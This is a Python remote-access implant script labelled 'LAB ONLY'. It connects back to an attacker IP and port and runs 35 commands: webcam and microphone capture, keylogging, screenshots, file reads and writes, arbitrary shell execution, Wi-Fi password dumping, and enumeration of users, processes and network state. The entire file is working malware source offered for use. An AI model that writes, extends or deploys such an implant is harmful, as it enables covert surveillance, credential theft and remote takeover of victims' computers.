# implant.py → RUN ON TARGET (Windows/macOS/Linux) — LAB ONLY
import socket, threading, subprocess, os, platform, time, pyautogui, webbrowser, ctypes, psutil, netifaces, requests
from PIL import ImageGrab
from datetime import datetime

# === OPTIONAL IMPORTS ===
try:
    import pyaudio
    AUDIO = True
except:
    AUDIO = False
try:
    import cv2
    CV = True
except:
    CV = False
try:
    from pynput import keyboard
    listener = None
except:
    listener = None

# === CHANGE THIS TO YOUR ATTACKER IP ===
ATTACKER_IP = "10.0.0.50"   # ←←← YOUR KALI/ATTACKER IP
PORT = 4444

# Global state
camera_active = threading.Event()
mic_active = threading.Event()
logged_keys = []

def on_press(key):
    try:
        logged_keys.append(key.char if hasattr(key, 'char') and key.char else f' [{str(key).split(".")[-1]}] ')
    except:
        logged_keys.append(' [ERR] ')

def connect_loop():
    while True:
        try:
            s = socket.socket()
            s.connect((ATTACKER_IP, PORT))
            s.send(f"[ONLINE] {platform.system()} {platform.node()} {os.getlogin()}".encode())
            command_handler(s)
        except:
            time.sleep(5)

def command_handler(s):
    global listener
    while True:
        try:
            raw = s.recv(4096).decode('utf-8', errors='ignore').strip()
            if not raw: break
            parts = raw.split('\n', 1)
            cmd = parts[0].strip()
            payload = parts[1] if len(parts) > 1 else ""

            response = ""

            # ==================== ALL 35 COMMANDS ====================
            if cmd == "1":   # Turn on camera
                if CV:
                    camera_active.set()
                    def cam():
                        cap = cv2.VideoCapture(0)
                        while camera_active.is_set():
                            ret, frame = cap.read()
                            if ret: cv2.imshow('LAB WEBCAM - Press Q to close', frame)
                            if cv2.waitKey(1) == ord('q'): break
                        cap.release(); cv2.destroyAllWindows()
                    threading.Thread(target=cam, daemon=True).start()
                    response = "[+] Webcam ON"
                else:
                    response = "[-] OpenCV not installed"

            elif cmd == "2":   # Turn off camera
                camera_active.clear()
                response = "[+] Webcam OFF"

            elif cmd == "3" or cmd == "25":   # Record audio / Turn on mic
                if AUDIO:
                    mic_active.set()
                    def record():
                        p = pyaudio.PyAudio()
                        stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
                        frames = []
                        for _ in range(450):  # ~10 seconds
                            if not mic_active.is_set(): break
                            frames.append(stream.read(1024))
                        stream.stop_stream(); stream.close(); p.terminate()
                        wf = wave.open("recording.wav", "wb")
                        wf.setnchannels(1); wf.setsampwidth(2); wf.setframerate(44100)
                        wf.writeframes(b''.join(frames)); wf.close()
                    threading.Thread(target=record, daemon=True).start()
                    response = "[+] Recording 10 seconds..."
                else:
                    response = "[-] PyAudio missing"

            elif cmd == "4":   # Turn off mic
                mic_active.clear()
                response = "[+] Mic stopped"

            elif cmd == "5":   # Start keylogger
                if listener is None and keyboard:
                    listener = keyboard.Listener(on_press=on_press)
                    listener.start()
                    response = "[+] Keylogger started"
                else:
                    response = "[-] pynput missing or already running"

            elif cmd == "6":   # Stop keylogger
                if listener:
                    listener.stop()
                    listener = None
                response = "[+] Keylogger stopped"

            elif cmd == "7":   # Show keys
                response = "".join(logged_keys[-5000:]) or "No keys logged"
                logged_keys.clear()

            elif cmd == "8":   # Screenshot
                ImageGrab.grab().save("screenshot.png")
                response = "[+] Screenshot saved as screenshot.png"

            elif cmd == "9":   # List directory
                try:
                    response = "\n".join(os.listdir(payload or "."))
                except Exception as e:
                    response = str(e)

            elif cmd == "10":  # Read file
                try:
                    with open(payload, "r", encoding="utf-8", errors="ignore") as f:
                        response = f.read()
                except Exception as e:
                    response = str(e)

            elif cmd == "11":  # Write file
                try:
                    path, content = payload.split("\n", 1)
                    with open(path, "w", encoding="utf-8") as f:
                        f.write(content)
                    response = "[+] File written"
                except Exception as e:
                    response = str(e)

            elif cmd == "12":  # List processes
                response = "\n".join([f"{p.pid:<8} {p.name()}" for p in psutil.process_iter()[:100]])

            elif cmd == "13":  # Kill process
                try:
                    psutil.Process(int(payload)).terminate()
                    response = "[+] Process terminated"
                except:
                    response = "[-] Failed"

            elif cmd == "14":  # Network scan (simple)
                response = "Simple scan: 192.168.1.1–254 → use nmap in shell"

            elif cmd == "15":  # Execute command
                response = subprocess.getoutput(payload)

            elif cmd == "16":  # System info
                response = f"OS: {platform.system()} {platform.release()}\nMachine: {platform.machine()}\nUser: {os.getlogin()}\nTime: {datetime.now()}"

            elif cmd == "17":  # Network interfaces
                response = "\n".join(netifaces.interfaces())

            elif cmd == "18":  # Active connections
                response = "\n".join([str(c) for c in psutil.net_connections()[:50]])

            elif cmd == "19":  # Route table
                response = str(netifaces.gateways())

            elif cmd == "20":  # DNS cache
                response = str(psutil.net_if_stats())

            elif cmd == "21":  # Fetch passwords (Windows only)
                if "Win" in platform.system():
                    response = subprocess.getoutput("net user")
                else:
                    response = "Windows only"

            elif cmd == "22":  # Reboot
                os.system("shutdown /r /t 5" if "Win" in platform.system() else "shutdown -r now")
                response = "[+] Rebooting..."

            elif cmd == "23":  # Lock screen
                if "Win" in platform.system():
                    ctypes.windll.user32.LockWorkStation()
                    response = "[+] Screen locked"

            elif cmd == "24":  # Rick Roll
                webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
                response = "RICK RICKROLLED!"

            elif cmd == "26":  # Move mouse
                x, y = map(int, payload.split(","))
                pyautogui.moveTo(x, y)
                response = f"[+] Mouse moved to {x},{y}"

            elif cmd == "27":  # Click
                pyautogui.click()
                response = "[+] Clicked"

            elif cmd == "28":  # Wi-Fi passwords (Windows)
                if "Win" in platform.system():
                    profiles = [line.split(":")[1].strip() for line in subprocess.getoutput("netsh wlan show profiles").split("\n") if "All User Profile" in line]
                    out = ""
                    for p in profiles:
                        res = subprocess.getoutput(f'netsh wlan show profile name="{p}" key=clear')
                        pw = [l for l in res.split("\n") if "Key Content" in l]
                        out += f"{p}: {pw[0].split(":")[1].strip() if pw else 'None'}\n"
                    response = out
                else:
                    response = "Windows only"

            elif cmd == "29":  # Installed software
                response = subprocess.getoutput("wmic product get name" if "Win" in platform.system() else "brew list || dpkg -l")

            elif cmd == "30":  # Recent files
                response = subprocess.getoutput("powershell Get-ChildItem $env:APPDATA\\Microsoft\\Windows\\Recent\\* -File | Sort LastWriteTime -Desc | Select -First 10" if "Win" in platform.system() else "ls -lt ~ | head")

            elif cmd == "31":  # Startup items
                response = subprocess.getoutput('reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"' if "Win" in platform.system() else "ls ~/Library/LaunchAgents")

            elif cmd == "32":  # Scheduled tasks
                response = subprocess.getoutput("schtasks /query" if "Win" in platform.system() else "crontab -l")

            elif cmd == "33":  # User accounts
                response = subprocess.getoutput("net user" if "Win" in platform.system() else "cut -d: -f1 /etc/passwd")

            elif cmd == "34":  # System events
                response = subprocess.getoutput("wevtutil qe System /c:10 /f:text" if "Win" in platform.system() else "last -10")

            elif cmd == "35":  # Fetch URL
                try:
                    response = requests.get(payload, timeout=10).text[:20000]
                except:
                    response = "Failed to fetch"

            # Send response
            s.sendall((response + "\n---END---").encode('utf-8', errors='ignore'))

        except Exception as e:
            s.sendall(f"ERROR: {e}\n---END---".encode())
            break
    s.close()

threading.Thread(target=connect_loop, daemon=True).start()
print("[*] Implant running — waiting for connection...")
while True: time.sleep(100)
